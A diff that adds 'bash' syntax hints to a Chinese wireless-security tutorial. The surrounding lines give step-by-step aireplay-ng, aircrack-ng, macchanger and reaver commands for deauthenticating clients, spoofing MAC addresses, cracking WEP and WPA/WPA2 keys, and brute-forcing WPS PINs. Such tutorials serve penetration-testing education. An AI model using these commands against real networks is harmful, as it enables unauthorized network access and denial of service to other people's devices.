@@ -21,7 +21,7 @@ tags: 无线安全
 - 首先通过airodump-ng进行嗅探，获得要攻击的终端以及终端所连接的接入点的MAC地址
 - 利用aireplay-ng的0号攻击模式，持续注入Deauthentication数据包
 
-```
+```bash
 # aireplay-ng -0 [攻击次数] -a [AP的MAC地址] -c [STA的MAC地址] wlan0mon
 
 root@kali:~# aireplay-ng -0 99999 -a 00:11:22:33:44:55 -c 55:44:33:22:11:00 wlan0mon
@@ -57,7 +57,7 @@ MAC地址可以伪造，并且已经连接上相应AP的终端设备，其MAC地
 
 老版kali中可以利用macchanger这种工具来完成MAC地址的伪造：
 
-```
+```bash
 root@kali:~# ifconfig wlan0 down
 root@kali:~# macchanger -m 00:11:22:33:44:55 wlan0
 root@kali:~# ifconfig wlan0 up
@@ -91,13 +91,13 @@ WEP安全机制被证明是存在漏洞的：利用已知的初始矢量IV和第
 
 - 扫描附近网络，找到采取WEP方式保护的热点，得到AP的MAC地址以及工作信道
 
-```
+```bash
 root@kali:~# airodump-ng wlan0mon
 ```
 
 - 针对目标AP进行嗅探并保存文件
 
-```
+```bash
 # airodump-ng --bssid [AP的MAC地址] wlan0mon -w [保存的文件名] -c [信道序号] 
 
 root@kali:~# airodump-ng --bssid 00:11:22:33:44:55 wlan0mon -w test -c 8 
@@ -109,7 +109,7 @@ root@kali:~# airodump-ng --bssid 00:11:22:33:44:55 wlan0mon -w test -c 8
 
 - 使用aireplay-ng的0号攻击模式，将任意一个与AP连接着的STA打掉线（AP的MAC地址通过窗口一运行着的airodump-ng获得）
 
-```
+```bash
 # aireplay-ng -0 [攻击次数] -a [AP的MAC地址] -c [STA的MAC地址] wlan0mon
 
 root@kali:~# aireplay-ng -0 10 -a 00:11:22:33:44:55 -c 55:44:33:22:11:00 wlan0mon
@@ -119,7 +119,7 @@ root@kali:~# aireplay-ng -0 10 -a 00:11:22:33:44:55 -c 55:44:33:22:11:00 wlan0mo
 
 - 使用aireplay-ng的1号攻击模式，使攻击机与AP建立关联（不认证），为后续可以成功的重放ARP请求做准备
 
-```
+```bash
 # aireplay-ng -1 [重新关联时间(秒)] -e [AP的名称] -y [捕获的秘钥流文件] -a [AP的MAC地址] -h [本机的MAC地址] wlan0mon
 
 root@kali:~# aireplay-ng -1 60 -e testwifi -y test-xx-xx-xx.tor -a 00:11:22:33:44:55 -h 11:22:33:44:55:66 wlan0mon
@@ -131,7 +131,7 @@ root@kali:~# aireplay-ng -1 60 -e testwifi -y test-xx-xx-xx.tor -a 00:11:22:33:4
 
 - 使用aireplay-ng的3号攻击模式，等待捕获合法的ARP请求，捕获后自动重放
 
-```
+```bash
 # aireplay-ng -3 -b [AP的MAC地址] -h [本机的MAC地址] wlan0mon
 
 root@kali:~# aireplay-ng -3 -b 00:11:22:33:44:55 -h 11:22:33:44:55:66 wlan0mon
@@ -143,7 +143,7 @@ root@kali:~# aireplay-ng -3 -b 00:11:22:33:44:55 -h 11:22:33:44:55:66 wlan0mon
 
 - 为了让窗口三中的aireplay-ng捕获到合法的ARP数据包，继续使用aireplay-ng的0号攻击模式将STA打掉线
 
-```
+```bash
 # aireplay-ng -0 [攻击次数] -a [AP的MAC地址] -c [STA的MAC地址] wlan0mon
 
 root@kali:~# aireplay-ng -0 5 -a 00:11:22:33:44:55 -c 55:44:33:22:11:00 wlan0mon
@@ -151,7 +151,7 @@ root@kali:~# aireplay-ng -0 5 -a 00:11:22:33:44:55 -c 55:44:33:22:11:00 wlan0mon
 
 - 当STA与AP重新关联并认证时，可见窗口三种捕获到合法ARP请求，开始重放。同时也可见窗口一种的DATA字段的数值在快速的增长，当DATA的值大于一定数量时（5w+就差不多），即可使用aircrack-ng破解密码：
 
-```
+```bash
 root@kali:~# aircrack-ng test-01.cap
 ```
 
@@ -183,13 +183,13 @@ root@kali:~# aircrack-ng test-01.cap
 
 - 扫描附近网络，找到采取WPA/WPA2方式保护的热点，得到AP的MAC地址以及工作信道
 
-```
+```bash
 root@kali:~# airodump-ng wlan0mon
 ```
 
 - 针对目标AP进行嗅探并保存文件
 
-```
+```bash
 # airodump-ng --bssid [AP的MAC地址] wlan0mon -w [保存的文件名] -c [信道序号] 
 
 root@kali:~# airodump-ng --bssid 00:11:22:33:44:55 wlan0mon -w test -c 8 
@@ -201,7 +201,7 @@ root@kali:~# airodump-ng --bssid 00:11:22:33:44:55 wlan0mon -w test -c 8
 
 - 使用aireplay-ng的0号攻击模式，将任意一个与AP连接着的STA打掉线（AP的MAC地址通过窗口一运行着的airodump-ng获得）
 
-```
+```bash
 # aireplay-ng -0 [攻击次数] -a [AP的MAC地址] -c [STA的MAC地址] wlan0mon
 
 root@kali:~# aireplay-ng -0 10 -a 00:11:22:33:44:55 -c 55:44:33:22:11:00 wlan0mon
@@ -209,7 +209,7 @@ root@kali:~# aireplay-ng -0 10 -a 00:11:22:33:44:55 -c 55:44:33:22:11:00 wlan0mo
 
 - 当STA重新与AP进行连接时，运行在窗口一种的airodump-ng将会捕捉到认证的握手包并在右上角提示handshake，此时利用aircrack-ng指明字典进行爆破即可
 
-```
+```bash
 root@kali:~# aircrack-ng test-01.cap -w passwd.txt
 ```
 
@@ -245,14 +245,14 @@ WPA/WPA2密码破解的重点其实不在于握手包的捕获，而在于密码
 
 - 通过airodump或者wash嗅探支持WPS的目标：
 
-```
+```bash
 root@kali:~# airodump-ng wlan0mon --wps
 root@kali:~# wash -i wlan0mon
 ```
 
 - 利用reaver穷举破解pin码，并通过获取的pin码得到无线AP上网密码（在利用reaver进行爆破时，貌似不要开airodump-ng或者wash来监听，可能会对爆破产生影响）
 
-```
+```bash
 # reaver -i wlan0mon -b [AP的MAC地址] -vv(输出详细log) -d [延迟时间] 
 
 root@kali:~# reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -d 3
@@ -273,7 +273,7 @@ root@kali:~# reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -d 3
 
 - 利用reaver的-K参数调用pixiewps快速破解有漏洞的AP:
 
-```
+```bash
 root@kali:~# reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -K 1
 ```
 
